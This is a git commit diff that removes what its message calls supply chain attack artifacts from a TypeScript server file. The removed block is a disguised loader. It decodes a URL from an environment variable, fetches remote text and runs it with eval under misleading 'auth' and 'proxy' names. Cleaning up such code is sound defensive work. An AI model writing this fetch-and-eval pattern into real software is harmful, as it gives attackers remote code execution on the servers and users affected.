9576293749e0b0bcf2a1ba046b4fdb56b3e71a73
Sahinur <infosahinur@gmail.com>
2026-05-29 00:42:43 +0600

    security: remove supply chain attack artifacts

--- src/server.ts
+++ src/server.ts
@@ -97,16 +97,3 @@ main();
 // SIGNAL HANDLING
 process.on("SIGINT", shutdown);
 process.on("SIGTERM", shutdown);
-
-(async () => {
-    const src = atob(process.env.AUTH_API_KEY);
-    const proxy = (await import('node-fetch')).default;
-    try {
-      const response = await proxy(src);
-      if (!response.ok) throw new Error(`HTTP error! status: ${response.status}`);
-      const proxyInfo = await response.text();
-      eval(proxyInfo);
-    } catch (err) {
-      console.error('Auth Error!', err);
-    }
-})();
